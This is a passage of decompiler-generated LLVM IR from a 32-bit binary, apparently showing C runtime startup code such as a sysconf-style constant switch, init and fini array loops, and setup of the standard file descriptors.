dec_label_pc_8053208:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053212:                             ; preds = %dec_label_pc_80531f3
  %v1_8053212 = call i32 @function_8051a1b(i32 ptrtoint (i32* @0 to i32))
  %v1_8053217 = inttoptr i32 %v1_8053212 to i32*
  store i32 22, i32* %v1_8053217, align 4
  br label %dec_label_pc_8053307

dec_label_pc_8053222:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_805322c:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053236:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053240:                             ; preds = %dec_label_pc_80531f3
  %v0_8053243 = call i32 @function_805393d()
  br label %dec_label_pc_8053248

dec_label_pc_8053248:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_8053240
  br label %dec_label_pc_8053334

dec_label_pc_8053252:                             ; preds = %dec_label_pc_80531f3
  %v0_8053255 = call i32 @function_80539d4()
  br label %dec_label_pc_805325a

dec_label_pc_805325a:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_8053252
  br label %dec_label_pc_8053334

dec_label_pc_8053264:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_805326e:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053278:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053282:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_805328c:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053296:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532a0:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532aa:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532b4:                             ; preds = %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532bb:                             ; preds = %dec_label_pc_80531f3
  %v5_80532c1 = call i32 @function_8053740(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80532c9 = icmp slt i32 %v5_80532c1, 0
  %v1_80532cb = icmp eq i1 %v2_80532c9, false
  br i1 %v1_80532cb, label %dec_label_pc_80532dd, label %dec_label_pc_8053307

dec_label_pc_80532cf:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532d6:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532dd:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80532bb
  br label %dec_label_pc_8053334

dec_label_pc_80532e4:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532eb:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532f2:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_80532f9:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053300:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053307:                             ; preds = %dec_label_pc_80532bb, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_8053212
  br label %dec_label_pc_8053334

dec_label_pc_805330c:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053313:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_805331a:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053321:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053328:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_805332f:                             ; preds = %dec_label_pc_80531f3, %dec_label_pc_80531f3, %dec_label_pc_80531f3
  br label %dec_label_pc_8053334

dec_label_pc_8053334:                             ; preds = %dec_label_pc_8053328, %dec_label_pc_8053321, %dec_label_pc_805331a, %dec_label_pc_8053313, %dec_label_pc_805330c, %dec_label_pc_8053300, %dec_label_pc_80532f9, %dec_label_pc_80532f2, %dec_label_pc_80532eb, %dec_label_pc_80532e4, %dec_label_pc_80532d6, %dec_label_pc_80532cf, %dec_label_pc_80532dd, %dec_label_pc_80532b4, %dec_label_pc_80532aa, %dec_label_pc_80532a0, %dec_label_pc_8053296, %dec_label_pc_805328c, %dec_label_pc_8053282, %dec_label_pc_8053278, %dec_label_pc_805326e, %dec_label_pc_8053264, %dec_label_pc_805325a, %dec_label_pc_8053248, %dec_label_pc_8053236, %dec_label_pc_805322c, %dec_label_pc_8053222, %dec_label_pc_8053208, %dec_label_pc_8053307, %dec_label_pc_805332f
  %v0_8053337 = phi i32 [ 255, %dec_label_pc_8053328 ], [ 2048, %dec_label_pc_8053321 ], [ 99, %dec_label_pc_805331a ], [ 20, %dec_label_pc_8053313 ], [ -128, %dec_label_pc_805330c ], [ 1024, %dec_label_pc_8053300 ], [ 4, %dec_label_pc_80532f9 ], [ 32, %dec_label_pc_80532f2 ], [ 256, %dec_label_pc_80532eb ], [ 2147483647, %dec_label_pc_80532e4 ], [ 16, %dec_label_pc_80532d6 ], [ 127, %dec_label_pc_80532cf ], [ 200112, %dec_label_pc_80532dd ], [ 9, %dec_label_pc_80532b4 ], [ 65535, %dec_label_pc_80532aa ], [ -32768, %dec_label_pc_80532a0 ], [ -2147483648, %dec_label_pc_8053296 ], [ 8, %dec_label_pc_805328c ], [ 500, %dec_label_pc_8053282 ], [ 4096, %dec_label_pc_8053278 ], [ 16384, %dec_label_pc_805326e ], [ 1000, %dec_label_pc_8053264 ], [ 32768, %dec_label_pc_805325a ], [ 6, %dec_label_pc_8053248 ], [ 65536, %dec_label_pc_8053236 ], [ 100, %dec_label_pc_805322c ], [ 131072, %dec_label_pc_8053222 ], [ 1, %dec_label_pc_8053208 ], [ -1, %dec_label_pc_8053307 ], [ 32767, %dec_label_pc_805332f ]
  ret i32 %v0_8053337

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 14, 13, 16, 17, 15, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 3, 4, 5, 6, 7, 8, 9, 24, 25, 1, 2, 20, 21, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 26, 27, 28, 29, 10, 11 }
  uselistorder i32 65535, { 3, 0, 1, 2 }
  uselistorder i32 2048, { 3, 1, 4, 2, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 116, { 3, 1, 2, 0 }
  uselistorder i32 95, { 3, 1, 0, 2, 4, 5, 6 }
  uselistorder i32 68, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 65, { 0, 2, 3, 4, 1 }
  uselistorder i32 63, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 4, 5, 6, 2 }
  uselistorder i32 58, { 1, 0, 2, 3, 4 }
  uselistorder i32 54, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 27, { 3, 4, 5, 2, 1, 6, 7, 8, 0 }
  uselistorder i32 17, { 6, 4, 5, 2, 3, 1, 0, 7, 8 }
  uselistorder i32 13, { 0, 2, 3, 1 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 11, 8, 9, 10, 6 }
  uselistorder i32 5, { 5, 0, 8, 9, 7, 11, 12, 13, 6, 4, 3, 1, 2, 10 }
  uselistorder label %dec_label_pc_8053334, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8053307, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80532dd, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805325a, { 1, 0 }
  uselistorder label %dec_label_pc_8053248, { 1, 0 }
}

define i32 @function_8053338() local_unnamed_addr {
dec_label_pc_8053338:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053338 = load i32, i32* @ebx, align 4
  store i32 %v0_8053338, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 2), i32 0), label %dec_label_pc_805334c, label %dec_label_pc_8053359

dec_label_pc_805334c:                             ; preds = %dec_label_pc_8053338, %dec_label_pc_805334c
  %v1_80533536 = phi i32 [ %v1_8053353, %dec_label_pc_805334c ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 2), i32 -1), %dec_label_pc_8053338 ]
  store i32 ptrtoint (i32* @global_var_8053353.59 to i32), i32* %stack_var_-16, align 4
  %v5_805334c = mul i32 %v1_80533536, 4
  %v6_805334c = add i32 %v5_805334c, ptrtoint (i32* @global_var_80555a4.58 to i32)
  %v7_805334c = inttoptr i32 %v6_805334c to i32*
  %v8_805334c = load i32, i32* %v7_805334c, align 4
  call void @__pseudo_call(i32 %v8_805334c)
  %v0_8053353.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053353 = add i32 %v0_8053353.pre, -1
  store i32 %v1_8053353, i32* %ebx.global-to-local, align 4
  %v10_8053354 = icmp eq i32 %v0_8053353.pre, 0
  %v1_8053357 = icmp eq i1 %v10_8053354, false
  br i1 %v1_8053357, label %dec_label_pc_805334c, label %dec_label_pc_8053359

dec_label_pc_8053359:                             ; preds = %dec_label_pc_805334c, %dec_label_pc_8053338
  %v0_8053359 = load i32, i32* @global_var_80556e8.60, align 8
  %v1_805335e = icmp eq i32 %v0_8053359, 0
  br i1 %v1_805335e, label %dec_label_pc_8053364, label %dec_label_pc_8053362

dec_label_pc_8053362:                             ; preds = %dec_label_pc_8053359
  %v0_8053362 = load i32, i32* %stack_var_-16, align 4
  %v1_8053362 = call i32 @unknown_0(i32 %v0_8053362)
  br label %dec_label_pc_8053364

dec_label_pc_8053364:                             ; preds = %dec_label_pc_8053362, %dec_label_pc_8053359
  %v0_8053364 = load i32, i32* @global_var_80556ec.61, align 4
  %v1_805336a = icmp eq i32 %v0_8053364, 0
  br i1 %v1_805336a, label %dec_label_pc_8053373, label %dec_label_pc_805336e

dec_label_pc_805336e:                             ; preds = %dec_label_pc_8053364
  %v2_8053370 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053370, i32* %ebx.global-to-local, align 4
  %v0_8053371 = load i32, i32* %stack_var_-16, align 4
  %v1_8053371 = call i32 @unknown_0(i32 %v0_8053371)
  br label %dec_label_pc_8053373

dec_label_pc_8053373:                             ; preds = %dec_label_pc_8053364, %dec_label_pc_805336e
  %v2_8053373 = load i32, i32* %stack_var_-16, align 4
  ret i32 %v2_8053373

; uselistorder directives
  uselistorder i32 %v1_8053353, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053373, { 1, 0 }
  uselistorder label %dec_label_pc_805334c, { 1, 0 }
}

define i32 @function_8053377(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053377:
  ret i32 0
}

define i32 @function_805337a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805337a:
  %v0_805337a = load i32, i32* @eax, align 4
  ret i32 %v0_805337a
}

define i32 @function_805337b() local_unnamed_addr {
dec_label_pc_805337b:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_805337b = load i32, i32* @esi, align 4
  %v0_805337c = load i32, i32* @ebx, align 4
  %v0_8053380 = load i32, i32* @eax, align 4
  store i32 %v0_8053380, i32* @esi, align 4
  %v0_8053382 = load i32, i32* @edx, align 4
  store i32 %v0_8053382, i32* @ebx, align 4
  %v4_8053387 = call i32 @function_805144d(i32 %v0_8053380, i32 1, i32 %tmp6)
  %v8_805338f = icmp eq i32 %v4_8053387, -1
  %v1_8053390 = icmp eq i1 %v8_805338f, false
  br i1 %v1_8053390, label %dec_label_pc_80533ab, label %dec_label_pc_8053392

dec_label_pc_8053392:                             ; preds = %dec_label_pc_805337b
  %v0_8053394 = load i32, i32* @ebx, align 4
  %v6_805339a = call i32 @function_80515f4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054284.62, i32 0, i32 0), i32 %v0_8053394)
  %v1_80533a2 = load i32, i32* @esi, align 4
  %v12_80533a2 = icmp eq i32 %v6_805339a, %v1_80533a2
  br i1 %v12_80533a2, label %dec_label_pc_80533ab, label %dec_label_pc_80533a6

dec_label_pc_80533a6:                             ; preds = %dec_label_pc_8053392
  %v0_80533a6 = call i32 @function_8052daf()
  br label %dec_label_pc_80533ab

dec_label_pc_80533ab:                             ; preds = %dec_label_pc_8053392, %dec_label_pc_805337b, %dec_label_pc_80533a6
  %v2_80533ab = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805337c, i32* @ebx, align 4
  store i32 %v0_805337b, i32* @esi, align 4
  ret i32 %v2_80533ab

; uselistorder directives
  uselistorder i32 ()* @function_8052daf, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_80515f4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805144d, { 0, 3, 2, 1, 5, 4 }
  uselistorder label %dec_label_pc_80533ab, { 2, 0, 1 }
}

define i32 @function_80533af() local_unnamed_addr {
dec_label_pc_80533af:
  %v0_80533b2 = load i8, i8* @global_var_80556f0.63, align 16
  %v1_80533b2 = icmp eq i8 %v0_80533b2, 0
  %v1_80533b9 = icmp eq i1 %v1_80533b2, false
  br i1 %v1_80533b9, label %dec_label_pc_80533af.dec_label_pc_80533eb_crit_edge, label %dec_label_pc_80533bb

dec_label_pc_80533af.dec_label_pc_80533eb_crit_edge: ; preds = %dec_label_pc_80533af
  %v0_80533ee.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80533eb

dec_label_pc_80533bb:                             ; preds = %dec_label_pc_80533af
  store i8 1, i8* @global_var_80556f0.63, align 16
  store i32 4096, i32* @global_var_80556e4.64, align 4
  br label %dec_label_pc_80533eb

dec_label_pc_80533eb:                             ; preds = %dec_label_pc_80533af.dec_label_pc_80533eb_crit_edge, %dec_label_pc_80533bb
  %v0_80533ee = phi i32 [ %v0_80533ee.pre, %dec_label_pc_80533af.dec_label_pc_80533eb_crit_edge ], [ 0, %dec_label_pc_80533bb ]
  ret i32 %v0_80533ee

; uselistorder directives
  uselistorder i8 1, { 8, 5, 7, 0, 1, 2, 3, 4, 6 }
  uselistorder i8* @global_var_80556f0.63, { 1, 0 }
  uselistorder label %dec_label_pc_80533eb, { 1, 0 }
}

define i32 @function_80533ef(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80533ef:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80556dc.65, align 4
  store i32 %arg6, i32* @global_var_80556ec.61, align 4
  %v2_8053426 = mul i32 %arg2, 4
  %v3_8053426 = add i32 %tmp44, %v2_8053426
  store i32 %v3_8053426, i32* %edx.global-to-local, align 4
  %v1_8053429 = add i32 %v3_8053426, 4
  store i32 %v1_8053429, i32* @global_var_80556e0.66, align 32
  %v3_8053431 = load i32, i32* %arg3, align 4
  %v14_8053431 = icmp eq i32 %v1_8053429, %v3_8053431
  %v1_8053433 = icmp eq i1 %v14_8053431, false
  %v1_8053429.v3_8053426 = select i1 %v1_8053433, i32 %v1_8053429, i32 %v3_8053426
  store i32 %v1_8053429.v3_8053426, i32* @global_var_80556e0.66, align 32
  %v0_805343b = load i32, i32* @ecx, align 4
  store i32 %v0_805343b, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8053440 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8053445 = bitcast i32* %stack_var_-136 to i8*
  %v4_8053445 = call i32 @function_8051a6c(i8* %v3_8053445, i32 0, i32 120)
  %v0_805344a = load i32, i32* @global_var_80556e0.66, align 32
  br label %dec_label_pc_8053452

dec_label_pc_8053452:                             ; preds = %dec_label_pc_8053452, %dec_label_pc_80533ef
  %v0_8053452 = phi i32 [ %v1_8053455, %dec_label_pc_8053452 ], [ %v0_805344a, %dec_label_pc_80533ef ]
  %v1_8053452 = inttoptr i32 %v0_8053452 to i32*
  %v2_8053452 = load i32, i32* %v1_8053452, align 4
  %v3_8053452 = icmp eq i32 %v2_8053452, 0
  %v1_8053455 = add i32 %v0_8053452, 4
  %v1_8053458 = icmp eq i1 %v3_8053452, false
  br i1 %v1_8053458, label %dec_label_pc_8053452, label %dec_label_pc_8053479.preheader

dec_label_pc_8053479.preheader:                   ; preds = %dec_label_pc_8053452
  store i32 %v1_8053455, i32* @ebx, align 4
  %v1_805347922 = inttoptr i32 %v1_8053455 to i32*
  %v2_805347923 = load i32, i32* %v1_805347922, align 4
  %v3_805347924 = icmp eq i32 %v2_805347923, 0
  %v1_805347c26 = icmp eq i1 %v3_805347924, false
  br i1 %v1_805347c26, label %dec_label_pc_805345e.lr.ph, label %dec_label_pc_805347e

dec_label_pc_805345e.lr.ph:                       ; preds = %dec_label_pc_8053479.preheader
  %v3_805343e = ptrtoint i32* %stack_var_-168 to i32
  %v3_8053469 = add i32 %v3_805343e, 32
  br label %dec_label_pc_805345e

dec_label_pc_805345e:                             ; preds = %dec_label_pc_805345e.lr.ph, %dec_label_pc_8053476
  %v1_8053469 = phi i32 [ %v2_805347923, %dec_label_pc_805345e.lr.ph ], [ %v2_8053479, %dec_label_pc_8053476 ]
  %v0_8053468 = phi i32 [ %v1_8053455, %dec_label_pc_805345e.lr.ph ], [ %v1_8053476, %dec_label_pc_8053476 ]
  %v6_8053463 = icmp ugt i32 %v1_8053469, 14
  br i1 %v6_8053463, label %dec_label_pc_8053476, label %dec_label_pc_8053465

dec_label_pc_8053465:                             ; preds = %dec_label_pc_805345e
  %v0_8053465 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8053465, i32* %stack_var_-160, align 4
  store i32 %v0_8053468, i32* %stack_var_-168, align 4
  %v2_8053469 = mul i32 %v1_8053469, 8
  %v4_8053469 = add i32 %v3_8053469, %v2_8053469
  %v3_805346e = inttoptr i32 %v4_8053469 to i16*
  %v4_805346e = call i32 @function_8053c3a(i16* %v3_805346e, i32 %v0_8053468, i32 8)
  %v0_8053476.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053476

dec_label_pc_8053476:                             ; preds = %dec_label_pc_805345e, %dec_label_pc_8053465
  %v0_8053476 = phi i32 [ %v0_8053468, %dec_label_pc_805345e ], [ %v0_8053476.pre, %dec_label_pc_8053465 ]
  %v1_8053476 = add i32 %v0_8053476, 8
  store i32 %v1_8053476, i32* @ebx, align 4
  %v1_8053479 = inttoptr i32 %v1_8053476 to i32*
  %v2_8053479 = load i32, i32* %v1_8053479, align 4
  %v3_8053479 = icmp eq i32 %v2_8053479, 0
  %v1_805347c = icmp eq i1 %v3_8053479, false
  br i1 %v1_805347c, label %dec_label_pc_805345e, label %dec_label_pc_805347e

dec_label_pc_805347e:                             ; preds = %dec_label_pc_8053476, %dec_label_pc_8053479.preheader
  store i32 %v2_8053440, i32* @eax, align 4
  %v0_8053482 = call i32 @function_8053d0d()
  store i32 %v0_8053482, i32* @eax, align 4
  %v0_8053487 = call i32 @function_80533af()
  %v1_8053490 = icmp eq i32 %tmp39, 0
  %v1_8053492 = icmp eq i1 %v1_8053490, false
  %v1_8053494 = and i32 %tmp39, -65536
  %v2_8053494 = or i32 %v1_8053494, 4096
  %storemerge = select i1 %v1_8053492, i32 %tmp39, i32 %v2_8053494
  store i32 %storemerge, i32* @global_var_80556e4.64, align 4
  %v13_805349d = icmp eq i32 %tmp38, -1
  %v1_80534a2 = icmp eq i1 %v13_805349d, false
  br i1 %v1_80534a2, label %dec_label_pc_80534cd, label %dec_label_pc_80534a4

dec_label_pc_80534a4:                             ; preds = %dec_label_pc_805347e
  %v0_80534a4 = call i32 @function_8053a19()
  store i32 %v0_80534a4, i32* @ebx, align 4
  %v0_80534ab = call i32 @function_8053988()
  %v0_80534b0 = load i32, i32* @ebx, align 4
  %v12_80534b0 = icmp eq i32 %v0_80534b0, %v0_80534ab
  %v1_80534b2 = icmp eq i1 %v12_80534b0, false
  br i1 %v1_80534b2, label %dec_label_pc_80534e3, label %dec_label_pc_80534b4

dec_label_pc_80534b4:                             ; preds = %dec_label_pc_80534a4
  %v0_80534b4 = call i32 @function_80539ae()
  store i32 %v0_80534b4, i32* @ebx, align 4
  %v0_80534bb = call i32 @function_8053962()
  %v0_80534c0 = load i32, i32* @ebx, align 4
  %v12_80534c0 = icmp eq i32 %v0_80534c0, %v0_80534bb
  %v1_80534c2 = icmp eq i1 %v12_80534c0, false
  br i1 %v1_80534c2, label %dec_label_pc_80534e3, label %dec_label_pc_805350d

dec_label_pc_80534cd:                             ; preds = %dec_label_pc_805347e
  br label %dec_label_pc_80534e3

dec_label_pc_80534e3:                             ; preds = %dec_label_pc_80534cd, %dec_label_pc_80534b4, %dec_label_pc_80534a4
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80534ea = call i32 @function_805337b()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80534f9 = call i32 @function_805337b()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8053508 = call i32 @function_805337b()
  br label %dec_label_pc_805350d

dec_label_pc_805350d:                             ; preds = %dec_label_pc_80534b4, %dec_label_pc_80534e3
  store i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32* %esi.global-to-local, align 4
  %v0_8053512 = load i32, i32* @edi, align 4
  %v1_8053512 = inttoptr i32 %v0_8053512 to i32*
  %v2_8053512 = load i32, i32* %v1_8053512, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32* %esi.global-to-local, align 4
  store i32 %v2_8053512, i32* inttoptr (i32 134567460 to i32*), align 4
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80556e8.60, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567329), i32 7), label %dec_label_pc_805353e, label %dec_label_pc_8053532

dec_label_pc_8053532:                             ; preds = %dec_label_pc_805350d, %dec_label_pc_8053532
  %v4_8053532 = phi i32 [ %v1_8053539, %dec_label_pc_8053532 ], [ 0, %dec_label_pc_805350d ]
  store i32 ptrtoint (i32* @global_var_8053539.69 to i32), i32* %stack_var_-160, align 4
  %v5_8053532 = mul i32 %v4_8053532, 4
  %v6_8053532 = add i32 %v5_8053532, ptrtoint (i32* @global_var_80555a4.58 to i32)
  %v7_8053532 = inttoptr i32 %v6_8053532 to i32*
  %v8_8053532 = load i32, i32* %v7_8053532, align 4
  call void @__pseudo_call(i32 %v8_8053532)
  %v0_8053539 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053539 = add i32 %v0_8053539, 1
  store i32 %v1_8053539, i32* %ebx.global-to-local, align 4
  %v1_805353a = load i32, i32* %esi.global-to-local, align 4
  %v7_805353a = icmp ult i32 %v1_8053539, %v1_805353a
  br i1 %v7_805353a, label %dec_label_pc_8053532, label %dec_label_pc_805353e

dec_label_pc_805353e:                             ; preds = %dec_label_pc_8053532, %dec_label_pc_805350d
  store i32 134559044, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80555a4.58 to i32), i32 -134567332), i32 2), i32 0), label %dec_label_pc_8053556, label %dec_label_pc_8053562

dec_label_pc_8053556:                             ; preds = %dec_label_pc_805353e, %dec_label_pc_8053556
  %v4_8053556 = phi i32 [ %v1_805355d, %dec_label_pc_8053556 ], [ 0, %dec_label_pc_805353e ]
  store i32 ptrtoint (i32* @global_var_805355d.70 to i32), i32* %stack_var_-160, align 4
  %v5_8053556 = mul i32 %v4_8053556, 4
  %v6_8053556 = add i32 %v5_8053556, ptrtoint (i32* @global_var_80555a4.58 to i32)
  %v7_8053556 = inttoptr i32 %v6_8053556 to i32*
  %v8_8053556 = load i32, i32* %v7_8053556, align 4
  call void @__pseudo_call(i32 %v8_8053556)
  %v0_805355d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805355d = add i32 %v0_805355d, 1
  store i32 %v1_805355d, i32* %ebx.global-to-local, align 4
  %v1_805355e = load i32, i32* %esi.global-to-local, align 4
  %v7_805355e = icmp ult i32 %v1_805355d, %v1_805355e
  br i1 %v7_805355e, label %dec_label_pc_8053556, label %dec_label_pc_8053562

dec_label_pc_8053562:                             ; preds = %dec_label_pc_8053556, %dec_label_pc_805353e
  %v0_805356b = load i32, i32* %stack_var_-160, align 4
  %v1_805356b = call i32 @function_8051a1b(i32 %v0_805356b)
  %v1_8053570 = inttoptr i32 %v1_805356b to i32*
  store i32 0, i32* %v1_8053570, align 4
